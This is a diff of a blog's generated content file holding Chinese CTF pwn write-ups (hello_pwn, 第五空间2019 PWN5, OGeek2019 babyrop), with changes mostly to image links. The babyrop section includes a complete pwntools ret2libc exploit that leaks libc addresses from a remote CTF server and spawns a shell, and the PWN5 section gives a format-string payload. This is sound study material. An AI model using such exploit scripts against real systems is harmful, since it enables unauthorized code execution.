@@ -442,16 +442,16 @@
 <h2 id="1、get-shell"><a href="#1、get-shell" class="headerlink" title="1、get shell"></a>1、get shell</h2><p>nc接连，cat flag。</p>
 <hr>
 <h2 id="2、hello-pwn"><a href="#2、hello-pwn" class="headerlink" title="2、hello_pwn"></a>2、hello_pwn</h2><p>扔进ida，f5一波</p>
-<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120057322.png" alt="image-20210919120057322"></p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120057322.png"></p>
 <p>#alarm(时间)是闹钟函数，它可以在进程中设置一个定时器，当定时器指定的时间到时，</p>
 <p>#它向进程发送SIGALRM信号。</p>
 <p>#setbuf(文件流，缓冲区),将缓冲区与文件流相关联。</p>
 <p>#int read(int handle,void *buf,int len);读取打开文件的内容。</p>
 <p>#read（要读取的文件，文件内容所在缓冲区，读取的长度）</p>
 <p>查看sub_400686 </p>
-<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120126615.png" alt="image-20210919120126615"></p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120126615.png"></p>
 <p>看到system中的内容，可以确定它就是shellcode。 </p>
-<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120141832.png" alt="image-20210919120141832"></p>
+<p><img src="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/image-20210919120141832.png"></p>
 <p>从内存中也可以可以看出，变量unk_601068地址为601068，</p>
 <p>变量dword_60106C地址为60106C，二者相差4个内存单元。</p>
 <p>故待会随便输入4个数作为deadbeef。</p>
@@ -749,14 +749,14 @@
       </tags>
   </entry>
   <entry>
-    <title>第五空间2019 决赛PWN5</title>
+    <title>第五空间2019_决赛PWN5</title>
     <url>/2021/10/10/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%20PWN5/</url>
     <content><![CDATA[<p>checksec</p>
-<p>![]([第五空间2019 决赛]PWN5.assets/image-20211021200621039.png)</p>
+<p><img src="/2021/10/10/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%20PWN5/image-20211021200621039.png"></p>
 <p>ida</p>
-<p>![]([第五空间2019 决赛]PWN5.assets/image-20211021200859520.png)</p>
+<p><img src="/2021/10/10/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%20PWN5/image-20211021200859520.png"></p>
 <p>注意这一句,通过向atoi写入预想的值即可</p>
-<p>![]([第五空间2019 决赛]PWN5.assets/image-20211021200920963.png)</p>
+<p><img src="/2021/10/10/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%20PWN5/image-20211021200920963.png"></p>
 <p>格式化字符串利用：</p>
 <p>payload = p32(addr)+deadbeef+b’%s$n’</p>
 <p>exp：</p>
@@ -776,19 +776,19 @@
       </tags>
   </entry>
   <entry>
-    <title>OGeek2019 babyrop</title>
+    <title>OGeek2019_babyrop</title>
     <url>/2021/10/10/OGeek2019%20babyrop/</url>
     <content><![CDATA[<p>checksec </p>
-<p>![](OGeek2019 babyrop.assets/image-20211021235625510.png)</p>
+<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211021235625510.png"></p>
 <p>ida</p>
-<p>![](OGeek2019 babyrop.assets/image-20211022001224677.png)</p>
+<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022001224677.png"></p>
 <p>sub函数看看</p>
-<p>![](OGeek2019 babyrop.assets/image-20211022002155033.png)</p>
+<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022002155033.png"></p>
 <p>v5读入一个buf，而v1为buf的长度，然后一个strncmp函数</p>
-<p>![](OGeek2019 babyrop.assets/image-20211022002313426.png)</p>
+<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022002313426.png"></p>
 <p>它是逐个字节进行比较的，而这里我们要让他直接停止比较，使得v1等于0 ，故往buf中写入\0。</p>
 <p>接下来是这个</p>
-<p>![](OGeek2019 babyrop.assets/image-20211022002756780.png)</p>
+<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022002756780.png"></p>
 <p>这边传进来的参数，是前面buf中最后一个字节的int值。而这里要从e7开始溢出，故只能用else中的read函数，所以buf中最后一个字节要尽可能的大。</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#32位程序，先用\0终止strlen函数，之后用Ret2libc得到sys与binsh地址</span></span><br><span class="line"><span class="comment">#用write_plt泄露write的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29773</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn9&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn9&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr = e.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got_addr = e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">sub_080487D0 = <span class="number">0x080487D0</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">6</span> + p32(<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0xE7</span> + <span class="number">4</span></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;a&#x27;</span> + p32(write_plt_addr) + p32(sub_080487D0) + p32(<span class="number">1</span>) + p32(write_got_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr)) </span><br><span class="line">libcbase = write_addr -<span class="number">0x0d43c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase:&#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys_addr = libcbase +<span class="number">0x03a940</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line"><span class="comment">#libcbase= write_addr -libc.dump(&#x27;write&#x27;)</span></span><br><span class="line"><span class="comment">#sys_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3 = offset * <span class="string">b&#x27;A&#x27;</span> + p32(sys_addr)+ p32(<span class="number">0</span>)  + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
